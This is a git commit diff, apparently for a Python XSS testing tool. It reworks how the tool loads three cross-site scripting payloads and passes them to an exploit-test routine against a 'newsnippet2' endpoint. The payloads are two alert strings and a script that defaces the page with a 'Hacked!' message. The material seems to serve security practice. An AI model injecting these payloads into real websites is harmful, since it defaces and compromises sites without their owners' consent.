6f28f7acfce25e41b444693dbf8bcfdce5ce8a0e
evgsam <evgsamarin@gmail.com>
2026-02-02 21:44:31 +0300

    обновлённый код использования xss уязвимостей

--- src/main.py
+++ src/main.py
@@ -1,28 +1,9 @@
 import requests
 from config import AppConfig
 from auth import authorization
-from get_data import get_data_
 from payloads import get_payloads
 from http_client import HttpClient
-
-def handle_status(code):
-    if code == 200:
-        print("Успешно!")
-        return
-    #ошибки
-    errors = {
-        404: "Ресурс не найден. Проверьте URL.",
-        429: "Слишком много запросов. Подождите.",
-        403: "Доступ запрещен.",
-        401: "Требуется авторизация.",
-    }
-    
-    if code in errors:
-        raise Exception(f"{code}: {errors[code]}")
-    elif code >= 500:
-        raise Exception(f"{code}: Ошибка сервера.")
-    else:
-        raise Exception(f"{code}: Ошибка запроса.")
+from exploit_test import exploit_test
 
 
 def main():
@@ -31,8 +12,7 @@ def main():
     client = HttpClient(credentials,session)
     response = authorization(client)
     payloads = get_payloads()
-    response = get_data_(client,f"/newsnippet2?snippet={payloads[1]}")
-
+    exploit_test(client,payloads)
 
 if __name__ == "__main__":
     main()
--- src/payloads.py
+++ src/payloads.py
@@ -1,9 +1,15 @@
-XSS_PAYLOADS = [
-    "<script>alert('test')</script>",
-    "<img src=\"nonexistent.jpg\" onerror=\"alert('XSS')\">",
-    "<script>document.body.innerHTML = '<h1>Hacked!</h1><p>This site has been compromised.</p>';</script>"
-]
+#XSS_PAYLOADS = [
+#    "<script>alert('test')</script>",
+#    "<img src=\"nonexistent.jpg\" onerror=\"alert('XSS')\">",
+#    "<script>document.body.innerHTML = '<h1>Hacked!</h1><p>This site has been compromised.</p>';</script>"
+#]
 
-def get_payloads()->list:
+XSS_PAYLOADS = {
+    "test": "<script>alert('test')</script>",
+    "XSS": "<img src=\"nonexistent.jpg\" onerror=\"alert('XSS')\">",
+    "Hacked!": "<script>document.body.innerHTML = '<h1>Hacked!</h1><p>This site has been compromised.</p>';</script>"
+}
+
+def get_payloads()->dict:
     return XSS_PAYLOADS
 
